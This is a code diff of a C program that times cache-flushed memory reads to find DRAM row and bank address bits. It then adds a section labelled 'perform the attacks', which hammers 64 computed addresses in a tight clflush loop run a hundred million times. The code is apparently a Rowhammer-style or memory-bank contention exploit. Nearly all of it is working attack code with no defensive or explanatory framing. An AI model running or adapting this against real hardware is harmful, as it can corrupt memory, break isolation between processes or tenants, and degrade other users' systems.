@@ -9,31 +9,12 @@
 #include <sys/resource.h>
 
 
-#define ROUND_NR 1000000000
+#define ROUND_NR 100000000
 
 void cache_flush(uint8_t *address) {
-        __asm__ volatile("clflush (%0)"
-                         :
-                         :"r"(address)
-                         :"memory"
-                        );
+        __asm__ volatile("clflush (%0)": :"r"(address) :"memory");
         return;
 }
-
-/*void single_access(uint8_t *addr, uint8_t value)
-{
-        __asm__ volatile(
-                "mov %0, %%r9\n\t"
-                "mov %1, %%r10\n\t"
-                "mov %%r10, (%%r9)\n\t"
-                "lfence\n\t"
-                :
-                :"r"(addr), "r"(value)
-                :
-                );
-        return;
-}
-*/
 
 uint64_t rdtsc(void) {
         uint64_t a, d;
@@ -57,7 +38,7 @@ int main(int argc, char* argv[]) {
 		return 0;
 	}
 
-	int i;
+	int i, j;
 	for (i=0; i<mem_size/sizeof(uint8_t); i++)
 		mem_chunk[i] = 1;
 
@@ -65,7 +46,9 @@ int main(int argc, char* argv[]) {
 	volatile uint8_t next = 0;;
 	uint64_t start, end;
 
-	for (bit=6; bit<30; bit++) {
+
+/**********************Setp1: identify the row indexes (longer time)*****************************/
+/*	for (bit=6; bit<30; bit++) {
 		offset = (1<<bit)/sizeof(uint8_t);
 
 		start = rdtsc();
@@ -78,6 +61,51 @@ int main(int argc, char* argv[]) {
 		end = rdtsc();
 
 		printf("Bit %d: %lu cycles\n", bit, (end - start));
+	}
+*/
+
+/**********************Setp2: identify the bank indexes (shoter time)*****************************/
+/*	for (bit=6; bit<30; bit++) {
+		offset = ((1<<23) + (1<<bit))/sizeof(uint8_t);
+
+		start = rdtsc();
+		for (i=0; i<ROUND_NR/2; i++) {
+			next += mem_chunk[0];
+			cache_flush(&mem_chunk[0]);
+			next -= mem_chunk[offset];
+			cache_flush(&mem_chunk[offset]);
+		}
+		end = rdtsc();
+
+		printf("Bit %d: %lu cycles\n", bit, (end - start));
+	}
+*/
+
+/**********************Setp3: perform the attacks*****************************/
+	int bank_index[6];
+	int access_index[64];
+
+	bank_index[0] = 6;
+	bank_index[1] = 7;
+	bank_index[2] = 15;
+	bank_index[3] = 16;
+	bank_index[4] = 20;
+	bank_index[5] = 21;
+
+	for (i=0; i<64; i++) {
+		access_index[i] = (((i>>5)&0x1)<<bank_index[5])/sizeof(uint8_t) +
+				  (((i>>4)&0x1)<<bank_index[4])/sizeof(uint8_t) +
+				  (((i>>3)&0x1)<<bank_index[3])/sizeof(uint8_t) +
+				  (((i>>2)&0x1)<<bank_index[2])/sizeof(uint8_t) +
+				  (((i>>1)&0x1)<<bank_index[1])/sizeof(uint8_t) +
+				  (((i>>0)&0x1)<<bank_index[0])/sizeof(uint8_t);
+	}
+
+	for (i=0; i<ROUND_NR; i++) {
+		for (j=0; j<64; j++) {
+				next += mem_chunk[access_index[j]];
+				cache_flush(&mem_chunk[access_index[j]]);
+		}
 	}
 
 	return 0;
